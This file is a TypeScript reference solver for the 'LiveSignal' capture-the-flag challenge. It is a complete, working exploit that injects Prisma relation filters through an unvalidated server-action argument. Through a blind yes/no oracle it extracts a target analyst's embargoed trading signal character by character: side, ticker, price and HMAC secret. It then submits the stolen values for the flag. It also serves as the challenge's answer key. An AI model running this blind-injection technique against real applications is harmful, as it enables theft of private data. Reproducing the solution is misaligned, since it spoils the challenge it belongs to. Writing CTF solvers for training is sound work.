/**
 * LiveSignal reference solver.
 *
 * Exploits a Prisma relation-filter injection through an unvalidated
 * server-action argument to leak the embargoed (ticker, side, price)
 * draft for @quant_sable, then submits it at /insiders for the flag.
 *
 * Transport: uses the included /api/solve-proxy/[action] JSON wrapper.
 */

import * as readline from "node:readline/promises";

async function promptUrl(message: string): Promise<string> {
  const rl = readline.createInterface({ input: process.stdin, output: process.stderr });
  try {
    while (true) {
      const answer = (await rl.question(message)).trim();
      if (/^https?:\/\//i.test(answer)) return answer.replace(/\/+$/, "");
      process.stderr.write("    must start with http:// or https://\n");
    }
  } finally {
    rl.close();
  }
}

let BASE = "";
const TARGET_HANDLE = "quant_sable";
const TICKER_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-";
const HEX_ALPHABET = "0123456789abcdef";
const HMAC_LEN = 32;
const RATE_DELAY_MS = 110; // stays under 600 req/min

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

async function postJson(path: string, body: unknown): Promise<unknown> {
  const res = await fetch(`${BASE}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  if (res.status === 429) {
    process.stderr.write("[rate-limited — backing off 30s]\n");
    await sleep(30_000);
    return postJson(path, body);
  }
  return res.json();
}

async function probe(draftPredicate: Record<string, unknown>): Promise<boolean> {
  await sleep(RATE_DELAY_MS);
  const body = {
    author: {
      handle: TARGET_HANDLE,
      signals: {
        some: {
          publishedAt: { gt: new Date().toISOString() },
          ...draftPredicate,
        },
      },
    },
    limit: 1,
  };
  const data = (await postJson("/api/solve-proxy/signalsByAnalyst", body)) as
    | unknown[]
    | { error: string };
  if (!Array.isArray(data)) {
    throw new Error(`server error: ${data.error}`);
  }
  return data.length > 0;
}

async function extractSide(): Promise<"YES" | "NO"> {
  process.stderr.write("[*] extracting side...\n");
  return (await probe({ side: "YES" })) ? "YES" : "NO";
}

async function extractTicker(side: "YES" | "NO"): Promise<string> {
  process.stderr.write("[*] extracting ticker (linear prefix scan)...\n");
  let prefix = "";
  // tickers are 10-25 chars of [A-Z0-9-]
  while (prefix.length < 40) {
    let foundNext: string | null = null;
    for (const ch of TICKER_ALPHABET) {
      const guess = prefix + ch;
      if (await probe({ side, ticker: { startsWith: guess } })) {
        foundNext = ch;
        process.stderr.write(`    prefix="${guess}"\n`);
        break;
      }
    }
    if (foundNext === null) {
      // prefix cannot be extended — either it's the full ticker, or we went past the end
      if (await probe({ side, ticker: prefix })) return prefix;
      throw new Error(`ticker extraction stuck at "${prefix}"`);
    }
    prefix += foundNext;
  }
  throw new Error(`ticker extraction runaway (prefix=${prefix})`);
}

async function extractPrice(side: "YES" | "NO", ticker: string): Promise<number> {
  process.stderr.write("[*] extracting price (binary search 1..99)...\n");
  let lo = 1;
  let hi = 100; // exclusive
  while (hi - lo > 1) {
    const mid = Math.floor((lo + hi) / 2);
    const matched = await probe({ side, ticker, contractPrice: { gte: mid } });
    process.stderr.write(`    [${lo},${hi}) gte ${mid} → ${matched}\n`);
    if (matched) lo = mid;
    else hi = mid;
  }
  return lo;
}

async function extractHmac(
  side: "YES" | "NO",
  ticker: string,
  contractPrice: number,
): Promise<string> {
  process.stderr.write("[*] extracting signalHmac (hex prefix scan)...\n");
  let prefix = "";
  while (prefix.length < HMAC_LEN) {
    let foundNext: string | null = null;
    for (const ch of HEX_ALPHABET) {
      const guess = prefix + ch;
      if (
        await probe({
          side,
          ticker,
          contractPrice,
          signalHmac: { startsWith: guess },
        })
      ) {
        foundNext = ch;
        process.stderr.write(`    hmac="${guess}"\n`);
        break;
      }
    }
    if (foundNext === null) {
      throw new Error(`hmac extraction stuck at "${prefix}"`);
    }
    prefix += foundNext;
  }
  return prefix;
}

async function submitFlag(
  ticker: string,
  side: "YES" | "NO",
  contractPrice: number,
  signalHmac: string,
) {
  process.stderr.write("[*] submitting credentials to /insiders...\n");
  return postJson("/api/solve-proxy/verifyInsider", {
    ticker,
    side,
    contractPrice,
    signalHmac,
  });
}

async function main() {
  BASE = process.env.TARGET ?? (await promptUrl("target URL (e.g. http://localhost:3000): "));
  process.stderr.write(`[*] target: ${BASE}\n`);

  const side = await extractSide();
  process.stderr.write(`[+] side: ${side}\n`);

  const ticker = await extractTicker(side);
  process.stderr.write(`[+] ticker: ${ticker}\n`);

  const price = await extractPrice(side, ticker);
  process.stderr.write(`[+] price: ${price}¢\n`);

  const hmac = await extractHmac(side, ticker, price);
  process.stderr.write(`[+] hmac: ${hmac}\n`);

  const result = (await submitFlag(ticker, side, price, hmac)) as
    | { ok: true; flag: string; message: string }
    | { ok: false; message: string };

  if ("ok" in result && result.ok) {
    process.stderr.write("[+] FLAG:\n");
    process.stdout.write(result.flag + "\n");
  } else {
    process.stderr.write(`[-] submission rejected: ${JSON.stringify(result)}\n`);
    process.exit(2);
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
